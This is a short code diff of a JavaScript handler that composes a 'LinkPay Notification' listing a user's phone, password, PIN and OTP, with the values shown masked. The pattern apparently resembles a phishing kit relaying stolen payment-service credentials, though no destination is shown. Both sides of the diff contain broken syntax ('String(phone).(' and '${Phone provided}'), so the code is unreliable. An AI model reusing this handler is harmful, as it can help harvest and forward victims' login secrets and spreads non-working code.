@@ -18,7 +18,7 @@ export default async function handler(req, res) {
   const result = req.body?.result || "Action received";
 
   const Phone = phone
-    ? String(phone).(
+    ? String(phone).replace(
         /^(\+?\d{2})\d+(\d{2})$/,
         ""
       )
@@ -26,7 +26,7 @@ export default async function handler(req, res) {
 
   const message =
     `🔔 LinkPay Notification\n\n` +
-    `📱 Phone: ${Phone}\n` +
+    `📱 Phone: ${Phone provided}\n` +
     `🔑 Password: ********\n` +
     `🔢 PIN: ****\n` +
     `🔐 OTP: ******\n` +
